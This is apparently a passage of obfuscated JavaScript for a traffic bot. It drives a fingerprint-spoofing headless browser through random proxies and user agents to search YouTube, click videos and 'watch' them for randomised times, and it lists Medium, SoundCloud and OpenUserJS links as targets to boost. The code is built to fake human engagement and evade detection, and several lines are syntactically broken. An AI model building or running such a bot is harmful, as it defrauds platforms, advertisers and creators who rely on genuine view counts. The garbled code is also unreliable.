      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + 'dium.com/@' + N(0x10) + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + N(0x11),
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + M(0x7) + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
      'https://me' + 'dium.com/@' + 'alexey.ink' + N(0x1b) + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
      'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + O(0x18, 'jp%D') + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + N(0xc) + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + M(0xb) + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ],
    'searchTerms': []
  };
data['searchTerm' + 's']['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + O(0x3, 'A*&4') + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), data['searchTerm' + 's']['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + N(0x19) + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), data['searchTerm' + 's']['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x53 * -0x29 + 0xbc * -0x15 + 0x1b1 * 0x11)), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x1 * 0x1e0a + -0x245 + 0x1bbb * -0x1)), data['searchTerm' + 's']['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), data['searchTerm' + 's'] = data['searchTerm' + 's']['flat'](-0x533 + 0x16e0 + -0x77 * 0x26);

function a() {
  const bb = [
    'ExrKlxrVz2DSzq',
    'pts/by-sit',
    'y29YCW',
    'W57cUXaBiCkktmk6imo+',
    'zwfZEwzVCMSUBW',
    'aIxdJConWPSNofBcVmk1',
    'C2v0vwLUDdmY',
    'zgL1Bs5JB20Vqa',
    'W7O0WQBdIIhdQmoSW47dVSkM',
    'zgvVlwHPzgvYlq',
    'ChrZl2j5lxnPDa',
    'B3jLl1LVDvr1yG',
    'AndDownBut',
    'easyfork.o',
    'z8ojW4vKeCo3qCklamoO',
    'ACoogvWTW5LXjmowba',
    'syn_52523/',
    '5d668f827a',
    'AdnoiseKWQ0',
    'hgfvmcBkc0',
    'nderer\x20>\x20y',
    'Cmo3W5/dIx4',
    'tw96AwXSys81lG',
    'DMvYEs1Uzxr3BW',
    'WQGMWQxdGtdcUSojW5VdOCkC',
    't\x20ex\x20emplo',
    'zmoBhLu4WOWSymkFgq',
    'in/never-h'
  ];
  a = function() {
    return bb;
  };
  return a();
}
const HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(f) {
        let g = this,
          h = g;
        for (let i = -0xb0c * -0x2 + -0x173a + -0x91 * -0x2; i < f; i++)
          h = h['concat'](g);
        return h;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
    }
  },
  arrs = new Map(),
  makeFetchCookie = require('fetch-cook' + 'ie');
HookManager['prototypes']();
const actions = [
  [
    () => flags['ActivateBr' + 'owser'],
    async () => {
      const U = d,
        T = b;
      async function f(z = '', A = 0x2a2 * -0x9 + 0x1 * 0x574 + 0x3 * 0x615, B) {
        const C = await B['waitForSel' + 'ector'](z);
        return await v['simClickEl' + 'ement'](C, {
          'pauseAfterMouseUp': A
        }), C;
      }
      async function g(z) {
        const A = await z['cookies']();
        for (const B of A)
          await z['deleteCook' + 'ie'](B);
        return await z['evaluate'](() => {
          window['name'] = '', localStorage['clear'](), sessionStorage['clear']();
        }), -0x1 * -0x12c7 + -0x2a * -0x55 + -0x20b8;
      }
      async function h(z) {
        let A = await u['newPage']();
        return await A['setDefault' + 'Navigation' + 'Timeout'](0xd72 + 0x1 * -0x1ac9 + -0x2ab * -0x5), await A['goto'](z, {
          'timeout': 0x0
        }), A;
      }
      async function i(z) {
        return await wait(0x9 * -0x4 + 0x17e6 + -0x2 * 0x21d), await z['waitForNet' + 'workIdle']({
          'idleTime': 0x1d4c,
          'timeout': 0x0
        }), 0x1f14 + 0x1d32 + -0x3 * 0x1417;
      }
      async function j(z) {
        log('watching..' + '.'), await z['evaluate'](() => {
          var B;
          (B = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x169b + -0x11 * -0x15a + 0x5 * -0x13, -0x10bb + 0xa42 + -0x1 * -0x680), B[Math['floor'](Math['random']() * B['length'])])['setAttribu' + 'te']('id', '__scope');
        }), await f('#__scope', 0x16cc + 0x1 * -0xf43 + -0x283 * 0x3, z), await i(z);
        const A = await k(z);
        return await wait(min((0x245e + -0x7a33 * -0x1 + 0x1 * 0x4bcf) * getRandomInt(-0x1c45 + 0x2d7 + 0x1970, -0x1ec3 + 0xa16 * 0x3 + 0x1 * 0x86), A)), -0x24d8 + -0xbe2 + -0x9bf * -0x5;
      }
      async function k(z) {
        return await z['evaluate'](() => {
          const A = {
            'Seconds': 0x3e8,
            'Minutes': 0xea60,
            'Hours': 0x36ee80,
            'Second': 0x3e8,
            'Minute': 0xea60,
            'Hour': 0x36ee80
          };
          let B = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
            C = -0x1e73 + 0x2346 + -0x5 * 0xf7;
          B = B['split'](B['includes']('of') ? '\x20of\x20' : ',\x20')[-0x739 + 0x5 * 0x6da + -0x361 * 0x8]['split']('\x20');
          for (let D = -0xb * 0xd3 + -0x5 * -0x29c + -0x3fb; D < B['length']; D += -0x1 * -0x5fb + 0x6 * -0x61 + 0x3b3 * -0x1)
            C += B[D] * A[B[D + (-0x1d89 + 0x1bbb + -0x1cf * -0x1)]];
          return C;
        });
      }
      async function l(z) {
        log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await z['goto'](channels['random'](), {
          'timeout': 0x0
        }), await f('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)', 0x1b * 0x67 + -0x1 * 0x2451 + -0x21f * -0xc, z), log('clicked\x20vi' + 'deo\x20stuff'), await i(z), log('page\x20netwo' + 'rk\x20idle\x20x2'), await z['evaluate'](() => {
          const C = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](E => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == E['getAttribu' + 'te']('class'))['slice'](0xa9b + 0x17 * 0x1 + -0xaac)['map'](E => Array['from'](E['children']))['flat'](-0x17 * -0x115 + 0x8 * -0x17b + -0xd0a)['map'](E => E['childNodes'][-0x1be6 + -0x2299 * 0x1 + 0x3e80]['childNodes'][-0x1d02 + 0x17f4 + 0x50e]['childNodes'][0x37 * -0x2f + 0x204b + -0x1631]['childNodes'][0xdb8 + -0x7 * -0x2e1 + -0x21df]['childNodes'][0x337 * 0x4 + -0x1c9b + 0xfc0]);
          var D;
          return (D = C)[Math['floor'](Math['random']() * D['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), C['map'](E => E['href']);
        }), await wait(getRandomInt(0x1502 + 0x1 * -0x116d + 0x53, -0x2536 * -0x1 + -0x149 * -0x1b + -0x247 * 0x17)), await f('#__hookedV' + 'idToWatch', -0x34 + 0x975 + 0x10 * -0x94, z), log('woah\x20click' + 'ed\x20some\x20vi' + 'deoo'), await wait(0x10 * -0x1c9 + -0x488 * -0x10 + 0xea8);
        const A = await k(z),
          B = min((0x17 * -0x13df + -0x1 * -0x1650e + 0x5 * 0x42df) * getRandomInt(0x3b * -0x9d + -0x4 * -0x128 + 0x1f91 * 0x1, 0x91 * -0xa + -0x759 + 0xd08), A);
        return log('Watching\x20v' + 'id\x20for\x20' + B + ('ms,\x20max\x20ti' + 'me:\x20') + A + 'ms'), await wait(B), -0x2 * -0x102a + 0x5e * 0x2a + 0x11 * -0x2cf;
      }
      async function m(z) {
        return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await z['waitForSel' + 'ector']('.style-sco' + 'pe\x20ytd-ric' + 'h-grid-row'), await z['evaluate'](() => {
          var A;
          (A = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](B => 'contents' != B['id']), A[Math['floor'](Math['random']() * A['length'])])['children'][-0x6e2 + -0x3 * 0x2cf + -0x1 * -0xf4f]['children'][-0x106a + -0x672 + -0x2c * -0x85]['children'][0x1d8f + -0x50 * -0x50 + -0x368f]['children'][0x12db * -0x2 + 0x1 * 0x1baa + 0xa0c]['children'][0x2455 + 0x790 + -0x295 * 0x11]['setAttribu' + 'te']('id', 'gottemezez');
        }), await f('#gottemeze' + 'z', 0xcfb * 0x1 + 0x2 * -0x17 + -0xccc, z), await i(z), await j(z), -0x1dcc * 0x1 + 0x254b + -0x77e;
      }
      async function n(z) {
        log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await z['evaluate'](() => {
          const P = b;
          let C = Array['from'](document['querySelec' + 'torAll']('#search'));
          document['getElement' + 'ById']('__searchBo' + 'xReal') || C['find'](D => P(0x15, 'Ulkz') === D['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
        }), await f('#__searchB' + 'oxReal', 0x10be + 0x2 * -0x1f7 + -0xcd0, z), await v['simKeyboar' + 'dType'](searchTerms['random']() + ''), await f('#search-ic' + 'on-legacy', 0x1ea7 + -0x3ae + -0x565 * 0x5, z), log('searching.' + '..'), await z['waitForFun' + 'ction']('Array.from' + '(document.' + 'getElement' + 'sByTagName' + '(\x22ytd-vide' + 'o-renderer' + '\x22)).length'), await i(z);
        let A = await z['evaluate'](() => {
          const C = {
              'seconds': 0x3e8,
              'minutes': 0xea60,
              'hours': 0x36ee80,
              'second': 0x3e8,
              'minute': 0xea60,
              'hour': 0x36ee80
            },
            D = (E = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](G => G['childNodes'][0x2f * -0x15 + -0x1c + 0x153 * 0x3]['childNodes'][0xff * 0x3 + -0x1 * 0x22db + 0x1fdf]['childNodes'][-0x38 * 0x2f + -0x14 * -0x16f + -0x621 * 0x3]))[Math['floor'](Math['random']() * E['length'])];
          var E;
          const F = D['childNodes'][0x1a0b + 0x8b2 + -0x194 * 0x16]['childNodes'][-0x11b1 + 0xf6 + 0x10bb]['childNodes'][0x87 * 0x22 + 0x6a * -0x5c + 0x4 * 0x50b]['ariaLabel'];
          return D['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'),
            function(G) {
              let H = G['split'](',\x20')['map'](J => J['split']('\x20'))['flat'](0x75e + 0x1ad6 + 0x5 * -0x6d7),
                I = -0x61d * -0x5 + 0x1ebb + -0x3d4c;
              for (let J = -0x1 * -0x1781 + 0x2d6 * 0xb + -0x36b3; J < H['length']; J += 0x4e4 + -0x1222 + 0xd40)
                I += H[J] * C[H[J + (-0xf0c + -0x5d * -0x1 + -0x10 * -0xeb)]];
              return I;
            }(F);
        });
        await f('#__hookedV' + 'idToClick', -0x2261 + 0x98 * -0x2b + 0x3be9, z);
        let B = min((-0x2 * 0x86f + 0x772a * -0x1 + -0x6dc * -0x36) * getRandomInt(0x749 * -0x3 + -0xe5 * -0x26 + -0xc22, 0x1 * 0xe9b + 0x2164 + 0x2ff5 * -0x1), A + (0x84a * -0x3 + -0x1db0 + -0xae * -0x6d));
        return log('watching\x20v' + 'ideo\x20for\x20' + B + 'ms'), await wait(B), -0x207c + 0x1 * -0x1615 + 0x3692;
      }
      async function o(z) {
        const R = d,
          Q = c;
        await z['goto']('https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + x['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y')), await f('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill', 0x931 + 0x2571 + -0x2ea1, z), await f('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + Q(0x0) + '-button-re' + R(0x14) + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill', 0x2398 + 0x10d * -0x16 + 0xc79 * -0x1, z);
        const A = setInterval(async () => {
          log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await z['evaluate'](() => {
            setTimeout(() => {
              const S = b;
              document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on') ? .[S(0x8, 'jp%D') + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
            }, -0x22c5 + 0xb71 + 0x230c * 0x1 + (-0xe5 * 0x25 + 0x21ff + -0x37 * -0xe) * Math['random']());
          });
        }, 0x3418 * -0x1 + -0x51a + 0x548a);
        await wait(0x2f8c4 + -0x5 * 0xdce5 + 0x12d * 0x509);
        try {
          z['$']('#__lllll') && await f('#__lllll', 0x109c + 0x57d * -0x4 + 0x25 * 0x25, z);
        } catch (B) {}
        return await wait((0x1 * -0x1ad0b + -0x1ae24 + -0x1 * -0x4458f) * getRandomInt(0x85a + -0x23 * 0x8f + 0xb37, 0x10d7 + -0x1 * 0x1fcd + 0x303 * 0x5)), clearInterval(A), 0xdb * -0x9 + 0x9a + 0x71a;
      }
      log('index.js\x20c' + 'alled');
      const {
        FakeBrowser: p
      } = require('fakebrowse' + 'r'), q = require('path'), r = q['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), s = new p['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1f81 + 0x6b9 + -0x263a)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([
        require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
          'blockTrackers': 0x1,
          'blockTrackersAndAnnoyances': 0x1
        }),
        require('@extra/pro' + 'xy-router')({
          'proxies': {
            'DEFAULT': flags['doUseProxy'] ? await getRandomProxy() : null
          }
        }),
        require('puppeteer-' + 'extra-plug' + 'in-timezon' + 'e')()
      ])['userDataDi' + 'r'](r);
